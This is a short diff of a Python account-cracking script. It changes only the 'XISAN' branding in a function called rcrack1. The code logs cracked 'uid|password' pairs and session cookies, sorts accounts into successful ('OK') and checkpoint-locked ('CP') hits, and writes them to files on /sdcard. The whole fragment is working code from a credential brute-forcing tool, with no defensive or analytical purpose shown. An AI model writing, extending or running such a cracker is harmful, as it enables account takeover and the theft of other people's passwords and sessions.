@@ -508,11 +508,11 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print(f"\033[38;5;46m[XISAN-67 -OK🌻] {uid}|{ps}")
+                print(f"\033[38;5;46m[XISAN -OK🌻] {uid}|{ps}")
 
                 print(f"\n[COOKIE🎁] : {coki}")
 
-                open('/sdcard/XISAN-67/ok.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/XISAN/ok.txt', 'a').write( uid+' | '+ps+'\n')
 
                 oks.append(uid)
 
@@ -524,9 +524,9 @@ def rcrack1(uid,pwx,tl):
 
                 cid = coki[82:97]
 
-                print(f"\x1b[38;5;196m[XISAN-67 -CP❌] {uid}|{ps}")
+                print(f"\x1b[38;5;196m[XISAN -CP❌] {uid}|{ps}")
 
-                open('/sdcard/XISAN-67 -CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/XISAN -CP.txt', 'a').write( uid+' | '+ps+' \n')
 
                 cps.append(uid)
 
